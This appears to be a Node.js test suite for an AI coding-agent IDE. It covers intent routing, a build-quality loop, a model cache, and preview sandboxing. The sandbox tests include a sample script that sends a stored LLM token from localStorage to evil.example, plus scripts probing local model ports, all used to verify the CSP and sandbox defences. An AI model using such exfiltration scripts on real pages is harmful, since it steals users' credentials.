'use strict';
/* Agent quality loop, LM Studio model cache, IDE Problems/preview labels. */
const fs = require('fs');
const path = require('path');
const vm = require('vm');

function load() {
  const distDir = path.join(__dirname, '..', 'dist');
  const store = {};
  const win = {
    console,
    localStorage: {
      getItem: (k) => (Object.prototype.hasOwnProperty.call(store, k) ? store[k] : null),
      setItem: (k, v) => { store[k] = String(v); },
      removeItem: (k) => { delete store[k]; }
    },
    addEventListener: () => {},
    document: {
      createElement: () => ({ style: {}, appendChild() {}, click() {}, remove() {}, addEventListener() {} }),
      body: { appendChild() {} },
      readyState: 'complete',
      addEventListener: () => {}
    },
    Event: function Event() {},
    fetch: async () => { throw new Error('network blocked'); },
    setTimeout,
    clearTimeout,
    setInterval,
    clearInterval,
    navigator: { clipboard: null }
  };
  win.window = win;
  const ctx = vm.createContext(win);
  const run = (name) => {
    vm.runInContext(fs.readFileSync(path.join(distDir, name), 'utf8'), ctx, { filename: name });
  };
  run('vendor/acorn.js');
  run('engine.js');
  run('engine.llm.js');
  return { win, store };
}

function chatReply(obj) {
  return {
    ok: true,
    status: 200,
    text: async () => JSON.stringify({
      choices: [{ message: { content: typeof obj === 'string' ? obj : JSON.stringify(obj) } }]
    })
  };
}

const THIN = {
  summary: 'Simple notepad',
  files: [
    {
      path: '/index.html',
      content: '<!DOCTYPE html><html lang="en"><head><title>Simple Notepad</title><link rel="stylesheet" href="/styles/app.css"></head><body><h1>Simple Notepad</h1><textarea placeholder="Start writing your notes here..."></textarea><button id="saveButton">Save Manually</button><button>Clear All Content</button><script src="/scripts/app.js"></script></body></html>'
    },
    {
      path: '/styles/app.css',
      content: 'body{font-family:sans-serif}textarea{width:100%;height:200px}'
    },
    {
      path: '/scripts/app.js',
      content: 'document.getElementById("saveButton").onclick=function(){localStorage.setItem("n",document.querySelector("textarea").value)};'
    }
  ]
};

const RICH_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Nova Notes</title>
  <link rel="stylesheet" href="/styles/app.css"/>
</head>
<body>
  <div class="app-shell">
    <aside class="sidebar">
      <div class="brand">Nova Notes</div>
      <nav>
        <button data-view="all">All notes</button>
        <button data-view="starred">Starred</button>
        <button data-view="archive">Archive</button>
      </nav>
      <button id="newNote">New note</button>
    </aside>
    <main>
      <header class="app-nav">
        <input id="search" placeholder="Search notes" aria-label="Search notes"/>
        <div class="meta">Esc to blur · Ctrl+N new</div>
      </header>
      <section class="editor-wrap">
        <input id="title" placeholder="Untitled"/>
        <textarea id="body" placeholder="Write in markdown. Autosaves."></textarea>
      </section>
      <div class="empty" hidden>No notes yet — create one to begin.</div>
    </main>
  </div>
  <script src="/scripts/app.js"></script>
</body>
</html>` + '<!-- layout ' + 'n'.repeat(900) + ' -->';

const RICH_CSS = `:root{--bg:#0b1020;--panel:#12182b;--line:rgba(255,255,255,.08);--text:#e8ecff;--accent:#7c6ff5}
body{margin:0;background:linear-gradient(180deg,#0b1020,#151a2e);color:var(--text);font-family:Inter,system-ui,sans-serif}
.app-shell{display:grid;grid-template-columns:260px 1fr;min-height:100vh}
.sidebar{background:var(--panel);border-right:1px solid var(--line);padding:18px}
.app-nav{display:flex;gap:12px;padding:16px;border-bottom:1px solid var(--line)}
textarea,input{width:100%;background:#0d1220;color:var(--text);border:1px solid var(--line);border-radius:10px}
button{background:var(--accent);color:#fff;border:0;border-radius:8px;padding:8px 12px}` +
  '\n/* tokens ' + 'c'.repeat(700) + ' */';

const RICH_JS = `const KEY='nova.notes.v1';
let notes=[];
try{notes=JSON.parse(localStorage.getItem(KEY)||'[]')}catch(e){notes=[]}
const save=()=>localStorage.setItem(KEY,JSON.stringify(notes));
document.getElementById('newNote').onclick=()=>{notes.unshift({id:Date.now(),title:'Untitled',body:''});save();};
document.addEventListener('keydown',e=>{if((e.ctrlKey||e.metaKey)&&e.key==='n'){e.preventDefault();document.getElementById('newNote').click();}});
`;

const RICH = {
  summary: 'Polished notes app',
  files: [
    { path: '/index.html', content: RICH_HTML },
    { path: '/styles/app.css', content: RICH_CSS },
    { path: '/scripts/app.js', content: RICH_JS }
  ]
};

module.exports = async function (t) {
  const appSrc = fs.readFileSync(path.join(__dirname, '..', 'dist', 'app.js'), 'utf8');
  t.ok('Problems panel reads message not only msg', appSrc.includes('p.message || p.msg'));
  t.ok('Live Preview no longer fake-binds the iframe once', !appSrc.includes("dataset.bound !== '1'"));
  t.ok('preview epoch invalidates stale srcdoc', appSrc.includes('_previewEpoch'));
  t.ok('IDE chrome does not pretend a Vite 5173 server is running', !/http:\/\/localhost:5173/.test(appSrc));
  t.ok('shared UI state is published as window.S', appSrc.includes('window.S = S'));
  t.ok('Generate App opens the IDE so files, code, and live UI are visible', appSrc.includes('function beginIdeBuild') && appSrc.includes("S.screen = 'ide'"));
  t.ok('writes stream into the open IDE editor', appSrc.includes('function watchBuildStep') && /S\.ideFile = path/.test(appSrc));
  t.ok('Agent prompt invites follow-ups on the same app', appSrc.includes('Ask a follow-up'));
  t.ok('IDE has a follow-up composer on the same project', appSrc.includes('ideFollowUpInput'));
  t.ok('Agent session persists across screens', appSrc.includes('cs.agent.session.v1'));
  t.ok('Recovery fills the Cross-Tab card after render (inline scripts in innerHTML never run)', /crossTabHost[\s\S]{0,400}renderCrossTabCard/.test(appSrc) || /getElementById\('crossTabHost'\)/.test(appSrc) && appSrc.includes('bindRecovery'));
  t.ok('bindRecovery paints Cross-Tab Communication', /function bindRecovery[\s\S]*renderCrossTabCard/.test(appSrc));
  t.ok('runAgentWith treats start-over as a new run, not a follow-up', appSrc.includes('promptIsRestart') && appSrc.includes('followUp = !restart'));
  t.ok('runAgentWith only treats a built app as a follow-up', appSrc.includes('followUp = !restart && !!S.agentBuilt'));
  t.ok('agentBuilt is set from this-run writes, not leftover index.html', appSrc.includes('function runWroteFiles') && appSrc.includes('if (wroteThisRun) S.agentBuilt = true'));
  t.ok('successful generate refreshes live preview in the IDE', /if \(wroteThisRun\)[\s\S]{0,500}refreshLivePreview\(\)/.test(appSrc));
  t.ok('failed generate does not toast Files created from leftover HTML', /No files written — leftover starter is not your app/.test(appSrc));
  t.ok('IDE follow-up writes unsaved editor buffer before Agent.run', appSrc.includes('function flushIdeBuffer') && appSrc.includes('function sendIdeFollowUp'));
  t.ok('Clear workspace resets the agent session', /function clearWorkspace[\s\S]{0,400}resetAgentSession/.test(appSrc));
  t.ok('session hydrate requires the current workspace', appSrc.includes('sessionMatchesWorkspace'));

  const { win, store } = load();
  const LLM = win.Engine.LLM;

  const fromJson = LLM.extractFilesFromText(JSON.stringify(THIN));
  t.ok('extractFilesFromText reads JSON files', fromJson && fromJson.files.length === 3 && fromJson.files[0].path === '/index.html');

  const fenced = [
    'FILE: /index.html',
    '```html',
    '<html lang="en"><body>Hi</body></html>',
    '```',
    'FILE: /styles/app.css',
    '```css',
    'body{color:red}',
    '```'
  ].join('\n');
  const fromFence = LLM.extractFilesFromText(fenced);
  t.ok('extractFilesFromText reads FILE fences', fromFence && fromFence.files.length === 2 && fromFence.files[1].path === '/styles/app.css');

  const thinScore = LLM.scoreBuild(THIN.files, []);
  t.ok('thin Simple Notepad fails the quality gate', thinScore.pass === false && thinScore.score < 55);
  t.ok('thin UI reason mentions placeholder notepad', thinScore.reasons.some(function (r) { return /notepad/i.test(r); }));

  const richScore = LLM.scoreBuild(RICH.files, []);
  t.ok('polished notes UI passes the quality gate', richScore.pass === true && richScore.score >= 55);

  const leftoverErr = [{ severity: 'error', file: '/evil.js', message: 'Use of eval() detected' }];
  t.ok('leftover workspace errors do not fail a good plan score', LLM.scoreBuild(RICH.files, leftoverErr).pass === true);
  const thinNoCss = [
    { path: '/index.html', content: '<html lang="en"><body><h1>Notes</h1><textarea></textarea><script src="/scripts/app.js"></script></body></html>' },
    { path: '/scripts/app.js', content: 'void 0;' },
    { path: '/styles/legacy.css', content: RICH_CSS }
  ];
  t.ok('leftover themed CSS is ignored when scoring only the written files', LLM.scoreBuild(thinNoCss.slice(0, 2), []).pass === false);

  t.ok('brain classifies a new app as generate', LLM.classifyIntent('create a notepad app').mode === 'generate');
  t.ok('brain selects repo+deps+runtime for a new app', LLM.classifyIntent('create a notepad app').engines.join(',') === 'repo,deps,runtime');
  t.ok('npm install is a deps route', LLM.classifyIntent('npm install lodash for the notes app').mode === 'deps');
  t.ok('install button is not a deps route', LLM.classifyIntent('add an install button to the toolbar').mode === 'generate');
  t.ok('twitter clone is not an external-repo route', LLM.classifyIntent('build a twitter clone').mode === 'generate');
  t.ok('github URL selects the repository engine', LLM.classifyIntent('use https://github.com/foo/bar as the starter').mode === 'repo');
  t.ok('github URL is captured for RAG', LLM.classifyIntent('use https://github.com/foo/bar as the starter').remotes[0].indexOf('github.com/foo/bar') >= 0);
  t.ok('start over only runs runtime, not a github scan', LLM.classifyIntent('start over from scratch').engines.join(',') === 'runtime');
  t.ok('sidebar tweak without history is generate, not edit', LLM.classifyIntent('make the sidebar purple').mode === 'generate');

  const secretFiles = RICH.files.map(function (f) {
    if (f.path !== '/scripts/app.js') return f;
    return { path: f.path, content: f.content + '\nconst apiKey = "sk-live-12345678secret";\n' };
  });
  const pretty = LLM.scoreBuild(secretFiles, []);
  const judgedSecret = LLM.evaluateBuild(secretFiles, {
    issues: [{ severity: 'error', file: '/scripts/app.js', message: 'Hard-coded secret', faultClass: 'sec.secret' }],
    capture: null
  }, pretty);
  t.ok('visual score can still look fine with a secret', pretty.pass === true);
  t.ok('brain evaluate fails a pretty UI that still has a P1 secret', judgedSecret.quality.pass === false);
  t.ok('brain evaluate reports the P1', judgedSecret.p1 >= 1);

  win.Engine.FS.write('/scripts/need-lodash.js', 'import _ from "lodash";\nexport const x = _.get;\n');
  t.ok('scanDeps finds a missing lodash import', LLM.scanDeps().missing.indexOf('lodash') >= 0);
  t.ok('install strategy names npm install lodash', LLM.scanDeps().install.some(function (p) { return /npm install lodash/.test(p.install); }));
  win.Engine.FS.write('/index.html', RICH_HTML);
  win.Engine.FS.write('/styles/app.css', RICH_CSS);
  win.Engine.FS.write('/scripts/app.js', RICH_JS);
  win.Engine.FS.write('/vendor/unrelated.js', 'export const leftover = "do-not-dump";\n');
  t.ok('listDir lists styles children', LLM.listDir('/styles').some(function (e) { return e.path === '/styles/app.css' && e.type === 'file'; }));
  t.ok('glob finds css without listing the whole tree as contents', LLM.glob('**/*.css').indexOf('/styles/app.css') >= 0);
  t.ok('grep finds the exact sidebar string', LLM.grep('sidebar').hits.some(function (h) { return /sidebar/.test(h.text) && h.path === '/index.html'; }));
  t.ok('grep regex finds save assignment', LLM.grep('const save\\s*=', { regex: true }).hits.some(function (h) { return h.path === '/scripts/app.js'; }));
  t.ok('readFile returns Nova Notes html', /Nova Notes/.test((LLM.readFile('/index.html') || {}).content || ''));
  t.ok('findSymbol locates save', LLM.findSymbol('save').some(function (s) { return s.path === '/scripts/app.js'; }));
  t.ok('traceDeps sees importers of app.js', (LLM.traceDeps('/scripts/app.js').importers || []).indexOf('/index.html') >= 0);
  const ctxSel = LLM.relevantContext('make the sidebar purple', { followUp: true });
  t.ok('relevantContext does not dump the whole repo', ctxSel.files.length <= 6 && ctxSel.files.length >= 1);
  t.ok('relevantContext includes the sidebar file', ctxSel.files.some(function (f) { return /sidebar/.test(f.content); }));
  t.ok('relevantContext omits unrelated vendor leftovers', !ctxSel.files.some(function (f) { return f.path === '/vendor/unrelated.js'; }));
  t.ok('formatExplore says selected files only', /selected files only/i.test(LLM.formatExplore(ctxSel)));
  t.ok('new-app relevantContext does not load leftover contents', LLM.relevantContext('create a notepad app', { followUp: false, includeContents: false }).skippedDump === true);
  t.ok('architecture questions are an explore route on an existing app', (win.S = { agentBuilt: true, agentRuns: ['create notes'], agentChat: [] }) && LLM.classifyIntent('where is the save function implemented?').mode === 'explore');
  t.ok('where-is without an app is still generate', (win.S = { agentBuilt: false, agentRuns: [], agentChat: [] }) && LLM.classifyIntent('where is the save function implemented?').mode === 'generate');
  const rag = LLM.formatRag(LLM.classifyIntent('npm install lodash'), LLM.scanRepo(), LLM.scanDeps(), null);
  t.ok('RAG tells the model not to fake node_modules', /Do not fake node_modules/.test(rag));
  const genRag = LLM.formatRag(LLM.classifyIntent('create a notepad app'), LLM.scanRepo(), LLM.scanDeps(), null);
  t.ok('generate RAG tells the model this is a new app', /NEW APP/.test(genRag));
  t.ok('generate RAG does not ask the model to patch leftovers', !/Decide, then patch/.test(genRag));
  t.ok('generate RAG does not list leftover workspace paths as the product', !/Repository scan:/.test(genRag));
  const repoRag = LLM.formatRag(LLM.classifyIntent('use https://github.com/foo/bar as the starter'), LLM.scanRepo(), LLM.scanDeps(), null);
  t.ok('first repo RAG tells the model this is a new app', /NEW APP/.test(repoRag));
  t.ok('first repo RAG does not ask the model to patch leftovers', !/Decide, then patch/.test(repoRag));
  t.ok('first repo RAG does not list leftover workspace paths as the product', !/Repository scan:/.test(repoRag));
  t.ok('first repo RAG still cites the GitHub/HF URL', /github\.com\/foo\/bar/.test(repoRag));
  const followRepoRag = LLM.formatRag(LLM.classifyIntent('use https://github.com/foo/bar as the starter'), LLM.scanRepo(), LLM.scanDeps(), null, { followUp: true });
  t.ok('follow-up repo RAG patches the existing app', /EXISTING app/.test(followRepoRag));
  t.ok('follow-up repo RAG is not a greenfield rebuild', !/NEW APP/.test(followRepoRag));

  const prose = 'Sure, here is the file:\n```html\n<html lang="en"><body>Hi</body></html>\n```\nHope this helps.';
  t.equal('stripFence drops surrounding model prose', LLM.stripFence(prose, '/index.html').trim(), '<html lang="en"><body>Hi</body></html>');
  const proseFn = 'Here is the function that saves notes:\n```javascript\nconst save = () => localStorage.setItem("n", body.value);\n```\nHope this helps; ping me.';
  t.equal(
    'stripFence unwraps a fence after an English sentence that mentions function',
    LLM.stripFence(proseFn, '/scripts/app.js').trim(),
    'const save = () => localStorage.setItem("n", body.value);'
  );
  const jsWithInnerFence = 'function demo(){\n  return `\n```html\n<div>hi</div>\n```\n`;\n}\n' + 'console.log("ok");\n'.repeat(8);
  t.ok('stripFence does not truncate JS that contains an inner fence', LLM.stripFence(jsWithInnerFence, '/scripts/app.js') === jsWithInnerFence.trim());
  const jsCommentInner = '// app.js — notes helper\nfunction demo(){\n  return `\n```html\n<div>hi</div>\n```\n`;\n}\n' + 'console.log("ok");\n'.repeat(4);
  t.ok('stripFence does not unwrap a JS file that starts with a // comment', LLM.stripFence(jsCommentInner, '/scripts/app.js') === jsCommentInner.trim());
  const cssWithHtml = 'body{color:red}\n/* <html lang="en"><body>nope</body></html> */\n' + '.x{display:block}\n'.repeat(12);
  t.ok('stripFence does not extract HTML out of a CSS file', LLM.stripFence(cssWithHtml, '/styles/app.css') === cssWithHtml.trim());

  const leftoverIssue = { severity: 'error', file: '/evil.js', message: 'Use of eval() detected' };
  const planIssue = { severity: 'warning', file: '/index.html', message: '<img> missing alt attribute' };
  const refine = LLM.buildRefinePrompt('notepad', RICH.files, [leftoverIssue, planIssue], { score: 40, reasons: ['CSS is too thin'] });
  t.ok('refine prompt includes issues from written files', /missing alt/.test(refine));
  t.ok('refine prompt omits leftover workspace validator errors', !/eval/.test(refine));

  LLM.setConfig({
    providerId: 'lmstudio',
    enabled: true,
    model: 'gemma-4-E4B-it-Q4_K_M',
    baseUrl: 'http://127.0.0.1:1234',
    localToken: 'lms-token'
  });

  win.fetch = async function (url) {
    t.ok('listModels still hits /v1/models', /\/v1\/models$/.test(String(url)));
    return {
      ok: true,
      status: 200,
      text: async () => JSON.stringify({
        data: [
          { id: 'gemma-4-E4B-it-Q4_K_M' },
          { id: 'qwen2.5-coder-7b' },
          { id: 'llama-3.2-3b' }
        ]
      })
    };
  };
  LLM.rememberModels(['custom-anything-i-typed'], 'lmstudio', 'http://127.0.0.1:1234');
  const listed = await LLM.listModels();
  t.equal('listModels returns every loaded id', listed.models.length, 3);
  t.ok('listModels persists loaded ids', LLM.cachedModels('lmstudio', 'http://127.0.0.1:1234').indexOf('qwen2.5-coder-7b') >= 0);
  t.ok('listModels keeps previously typed custom ids', LLM.cachedModels('lmstudio', 'http://127.0.0.1:1234').indexOf('custom-anything-i-typed') >= 0);
  t.ok('model cache is stored under cs.llm.models.v1', !!store['cs.llm.models.v1']);

  let posts = 0;
  win.fetch = async function () {
    posts++;
    throw new Error('ECONNREFUSED');
  };
  const failSteps = await win.Engine.Agent.run('create a notepad app');
  t.ok('failed LLM generate still writes the app from the prompt', failSteps.some(function (s) {
    return /writing files from your prompt/i.test(s.text || '');
  }));
  t.ok('failed LLM generate produces real files', /index\.html/.test((win.Engine.FS.read('/index.html') && 'index.html') || '') && (win.Engine.FS.read('/index.html') || '').length > 40);
  t.ok('failed LLM generate replaces leftover Pulse', !/◆ Pulse/.test(win.Engine.FS.read('/index.html') || ''));
  t.equal('failed LLM does not sequential-retry a down server', posts, 1);
  t.ok('connection errors are not described as a JSON-plan miss', !failSteps.some(function (s) {
    return /JSON plan failed/i.test(s.text || '');
  }));

  win.Engine.FS.write('/evil.js', 'eval("x")');
  let chatCalls = 0;
  win.fetch = async function (url, opts) {
    if (!/chat\/completions/.test(String(url))) {
      return { ok: false, status: 404, text: async () => '' };
    }
    const body = JSON.parse(opts.body);
    t.ok('chat completions omit a fake cloud model when using the selected id', body.model === 'gemma-4-E4B-it-Q4_K_M');
    chatCalls++;
    return chatReply(chatCalls === 1 ? THIN : RICH);
  };
  const steps = await win.Engine.Agent.run('create an advanced notepad app');
  t.ok('agent iterates after a weak first pass', chatCalls >= 2);
  t.ok('second round mentions refining', steps.some(function (s) {
    return /refining round/i.test(s.text || '');
  }));
  t.ok('agent loop is not hard-capped at 4 rounds', LLM.NO_FIXED_TOOL_LIMIT === true && LLM.SAFETY_CAP > 4);
  t.ok('quality gate eventually passes or finishes with a score', steps.some(function (s) {
    return s.kind === 'done' && /quality/i.test(s.text || '');
  }));
  t.ok('final index.html is not Simple Notepad', !/Simple Notepad/i.test(win.Engine.FS.read('/index.html') || ''));
  t.ok('final app has an app shell', /app-shell|sidebar/i.test(win.Engine.FS.read('/index.html') || ''));
  t.ok('engine source no longer falls back to the local synthesizer', !fs.readFileSync(path.join(__dirname, '..', 'dist', 'engine.llm.js'), 'utf8').includes('falling back to local synthesizer'));

  t.ok('follow-up helper is exported', typeof LLM.buildFollowUpPrompt === 'function' && typeof LLM.isFollowUp === 'function');
  t.ok('start over is treated as a restart, not a follow-up', LLM.looksLikeRestart('start over from scratch with a new app') === true);
  t.ok('make the sidebar purple is not a restart', LLM.looksLikeRestart('make the sidebar purple') === false);

  win.S = { agentRuns: ['create an advanced notepad app'], agentBuilt: true, agentChat: [
    { role: 'user', text: 'create an advanced notepad app' }
  ] };
  t.ok('prior agent run counts as a follow-up', LLM.isFollowUp('make the sidebar purple') === true);
  t.ok('explicit restart is not a follow-up even with history', LLM.isFollowUp('start over from scratch') === false);
  win.S = { agentRuns: ['create a notepad app'], agentBuilt: false, agentChat: [
    { role: 'user', text: 'create a notepad app' }
  ] };
  t.ok('failed generate history is not a follow-up', LLM.isFollowUp('create a kanban board') === false);
  t.ok('needsAppBeforeDone blocks generate done without index.html', LLM.needsAppBeforeDone({ mode: 'generate' }, false) === true);
  t.ok('needsAppBeforeDone allows generate done after index.html', LLM.needsAppBeforeDone({ mode: 'generate' }, true) === false);
  t.ok('needsAppBeforeDone allows explore done without writes', LLM.needsAppBeforeDone({ mode: 'explore' }, false) === false);
  t.ok('mustBuildBlock names leftover dashboard as not the product', /leftover Pulse\/SaaS dashboard/.test(LLM.mustBuildBlock()) && /NOT the product/.test(LLM.mustBuildBlock()));

  win.S = { agentRuns: ['create an advanced notepad app'], agentBuilt: true, agentChat: [
    { role: 'user', text: 'create an advanced notepad app' }
  ] };
  t.ok('brain treats a follow-up as edit, not a full rebuild', LLM.classifyIntent('make the sidebar purple').mode === 'edit');
  t.ok('edit intent skips the dependency engine', LLM.classifyIntent('make the sidebar purple').engines.indexOf('deps') < 0);
  t.ok('fix prompt on an existing app is repair', LLM.classifyIntent('fix the timeout error').mode === 'repair');

  const follow = LLM.buildFollowUpPrompt(
    'make the sidebar purple',
    RICH.files,
    [{ severity: 'warning', file: '/index.html', message: '<img> missing alt attribute' }],
    [{ role: 'user', text: 'create an advanced notepad app' }]
  );
  t.ok('follow-up prompt includes the latest request', /sidebar purple/.test(follow));
  t.ok('follow-up prompt includes current workspace HTML', /Nova Notes/.test(follow));
  t.ok('follow-up prompt includes conversation history', /advanced notepad/.test(follow));
  t.ok('follow-up prompt tells the model not to switch products', /EXISTING app/.test(follow));

  const followRefine = LLM.buildRefinePrompt('make the sidebar purple', RICH.files, [], { score: 40, reasons: ['CSS is too thin'] }, { followUp: true });
  t.ok('follow-up refine keeps the same product', /THIS same app/.test(followRefine));

  const PURPLE = {
    summary: 'Nova Notes with a purple sidebar',
    files: [
      { path: '/index.html', content: RICH_HTML.replace('class="sidebar"', 'class="sidebar" style="background:#6d28d9"') },
      { path: '/styles/app.css', content: RICH_CSS + '\n.sidebar{background:#6d28d9}\n' },
      { path: '/scripts/app.js', content: RICH_JS }
    ]
  };

  let followCalls = 0;
  let followBodies = [];
  win.fetch = async function (url, opts) {
    if (!/chat\/completions/.test(String(url))) {
      return { ok: false, status: 404, text: async () => '' };
    }
    followCalls++;
    const body = JSON.parse(opts.body);
    followBodies.push(body);
    return chatReply(PURPLE);
  };
  const followSteps = await win.Engine.Agent.run('make the sidebar purple');
  t.ok('follow-up run talks to the LLM', followCalls >= 1);
  t.ok('agent records a Brain route step', followSteps.some(function (s) {
    return s.kind === 'route' && /Brain:/.test(s.text || '');
  }));
  t.ok('follow-up activity says it is editing the current app', followSteps.some(function (s) {
    return /Follow-up on the current app/i.test(s.text || '');
  }));
  const firstUser = ((followBodies[0] && followBodies[0].messages) || []).map(function (m) { return m.content; }).join('\n');
  t.ok('follow-up LLM sees the current Nova Notes files', /Nova Notes/.test(firstUser));
  t.ok('follow-up LLM sees the new task', /sidebar purple/.test(firstUser));
  t.ok('follow-up LLM does not dump unrelated leftover files', !/do-not-dump/.test(firstUser) && !/eval\("x"\)/.test(firstUser));
  t.ok('follow-up records a repo explore step', followSteps.some(function (s) { return s.kind === 'explore' && /files in context/.test(s.text || ''); }));
  t.ok('follow-up system prompt is edit-mode', /EXISTING app/.test(((followBodies[0].messages || []).find(function (m) { return m.role === 'system'; }) || {}).content || ''));
  t.ok('follow-up keeps Nova Notes instead of rebuilding a new product', /Nova Notes/i.test(win.Engine.FS.read('/index.html') || ''));
  t.ok('follow-up applies the requested sidebar change', /#6d28d9/.test(win.Engine.FS.read('/styles/app.css') || '') || /#6d28d9/.test(win.Engine.FS.read('/index.html') || ''));

  const keepHtml = win.Engine.FS.read('/index.html') || '';
  let followFailPosts = 0;
  win.fetch = async function () {
    followFailPosts++;
    throw new Error('ECONNREFUSED');
  };
  const followFail = await win.Engine.Agent.run('make the sidebar orange');
  t.ok('follow-up with a down model does not replace the app', (win.Engine.FS.read('/index.html') || '') === keepHtml);
  t.ok('follow-up with a down model does not use the synthesizer', followFail.some(function (s) {
    return s.kind === 'error' && /synthesizer was not used/i.test(s.text || '');
  }));
  t.equal('follow-up down model does not sequential-retry', followFailPosts, 1);

  win.S = { agentRuns: [], agentBuilt: false, agentChat: [] };
  t.ok('first prompt with no history is not a follow-up', LLM.isFollowUp('create a notepad app') === false);

  const preview = win.Engine.Preview.build();
  t.ok('Live Preview injects a nested CSP', preview && /Content-Security-Policy/.test(preview));
  t.ok('preview CSP sets connect-src none so srcdoc cannot call local LLM ports', /connect-src 'none'/.test(preview));
  t.ok('preview CSP is document-start after any doctype', /^(\s*<!DOCTYPE[^>]*>)?\s*<meta http-equiv="Content-Security-Policy"/i.test(preview));
  t.ok('Preview.iframeCsp is the nested connect-src none policy', win.Engine.Preview.iframeCsp && /connect-src 'none'/.test(win.Engine.Preview.iframeCsp));
  t.ok('Preview.applyFrame is exported', typeof win.Engine.Preview.applyFrame === 'function');
  win.Engine.FS.write('/index.html', '<html><body><header>Top</header><head><title>X</title></head><body></body></html>');
  const headerFirst = win.Engine.Preview.build();
  const headerBlock = (headerFirst.match(/<header[\s\S]*?<\/header>/i) || [])[0] || '';
  t.ok('preview CSP is not injected into <header>', !/Content-Security-Policy/.test(headerBlock));
  t.ok('preview CSP is document-start even when <header> precedes <head>', /^\s*<meta http-equiv="Content-Security-Policy"/i.test(headerFirst));
  win.Engine.FS.write('/index.html', '<script>fetch("http://127.0.0.1:1234/v1/models")</script><html><head><title>X</title></head></html>');
  const scriptFirst = win.Engine.Preview.build();
  t.ok('CSP lands before a leading workspace script', scriptFirst.indexOf('Content-Security-Policy') < scriptFirst.indexOf('<script>fetch'));
  t.ok('CSP is not delayed until <head> when a script comes first', scriptFirst.indexOf('Content-Security-Policy') < scriptFirst.indexOf('<head'));
  win.Engine.FS.write('/index.html', '<!-- <head> fake --><script>fetch("http://127.0.0.1:8080/v1")</script><html><head><title>X</title></head></html>');
  const commentHead = win.Engine.Preview.build();
  t.ok('comment that mentions head does not delay CSP past a script', commentHead.indexOf('Content-Security-Policy') < commentHead.indexOf('<script>fetch'));
  const cspFrame = { attrs: {}, setAttribute: function (k, v) { this.attrs[k] = v; }, srcdoc: '' };
  win.Engine.Preview.applyFrame(cspFrame, '<script>x</script>');
  t.equal('applyFrame sets iframe csp before srcdoc', cspFrame.attrs.csp, win.Engine.Preview.iframeCsp);
  t.ok('applyFrame assigns srcdoc', cspFrame.srcdoc.indexOf('<script>x</script>') >= 0);
  const indexHtml = fs.readFileSync(path.join(__dirname, '..', 'dist', 'index.html'), 'utf8');
  t.ok('Live Preview iframe markup includes csp connect-src none', /id="previewFrame"[^>]*csp="[^"]*connect-src 'none'/.test(indexHtml) || /csp="[^"]*connect-src 'none'[^"]*"[^>]*id="previewFrame"/.test(indexHtml));
  t.ok('IDE preview iframes include csp', /data-idepreviewpanel[\s\S]{0,180}csp=/.test(appSrc) && /data-idepreview["\s][\s\S]{0,220}csp=/.test(appSrc));
  t.ok('preview loaders call applyFrame before srcdoc', /Preview\.applyFrame/.test(appSrc));
  win.Engine.FS.write('/index.html', RICH_HTML);
  t.ok('Agent activity escapes LLM text before innerHTML', /\$\{esc\(desc\)\}/.test(appSrc) && /\$\{esc\(file\)\}/.test(appSrc));
  t.ok('preview HTML severs window.opener', /window\.opener=null/.test(preview));
  t.ok('Preview.openTab is exported', typeof win.Engine.Preview.openTab === 'function');
  t.ok('IDE preview tab uses a detached blob open', appSrc.includes('Preview.openTab') && !appSrc.includes("w.document.write(h)"));
  const steal = '<html><body><script>location="https://evil.example/?k="+localStorage.getItem("cs.llm.v1")</script></body></html>';
  const shell = win.Engine.Preview.tabShell(steal);
  t.ok('preview tab shell sandboxes scripts without same-origin', /<iframe[^>]*sandbox="allow-scripts"/.test(shell) && !/allow-same-origin/.test(shell));
  t.ok('preview tab shell iframe has csp connect-src none', /<iframe[^>]*csp="[^"]*connect-src 'none'/.test(shell));
  t.ok('preview tab shell does not allow top navigation', !/allow-top-navigation/.test(shell));
  t.ok('preview tab shell puts user HTML in srcdoc, not as the host document', /srcdoc="/.test(shell) && shell.indexOf('<iframe') < shell.indexOf('&lt;script&gt;'));
  t.ok('preview tab shell escapes user markup so it cannot break out of srcdoc', /&lt;script&gt;/.test(shell) && !/<script>location=/.test(shell));
  const opened = [];
  win.Blob = function (parts) { this.text = (parts || []).join(''); };
  win.URL = { createObjectURL: function () { return 'blob:cs-preview'; }, revokeObjectURL: function () {} };
  win.open = function (url, target, feat) { opened.push({ url: url, target: target, feat: feat }); };
  win.setTimeout = function () { return 0; };
  const tab = win.Engine.Preview.openTab(steal);
  t.ok('openTab reports a sandboxed detach', tab && tab.ok && tab.sandboxed);
  t.ok('openTab uses noopener on the wrapper blob', opened[0] && opened[0].url === 'blob:cs-preview' && /noopener/.test(opened[0].feat || ''));
  t.ok('preview HTML does not re-allow loopback model servers', !/127\.0\.0\.1:1234/.test(preview) && !/localhost:8080/.test(preview));
  const snap = win.Engine.Preview.capture();
  t.ok('agent preview snapshot captures the built app title', snap && snap.inspect && /Nova Notes/i.test(snap.inspect.title || ''));
  t.ok('refine prompt can include the snapshot', /Live preview snapshot/.test(LLM.buildRefinePrompt('x', [{ path: '/index.html', content: '<h1>Hi</h1>' }], [], { score: 10, reasons: [] }, { capture: snap })));
};
